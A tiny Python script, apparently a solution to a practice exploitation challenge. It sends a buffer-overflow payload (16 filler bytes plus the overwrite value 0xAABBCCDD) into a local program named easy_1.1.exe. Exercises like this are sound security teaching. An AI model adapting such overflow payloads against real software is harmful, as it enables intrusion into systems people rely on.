from subprocess import PIPE, Popen

payload = b"a"*16 + b"\xDD\xCC\xBB\xAA"

p1 = Popen("easy_1.1.exe", stdin=PIPE)
p1.communicate(payload)
p1.wait()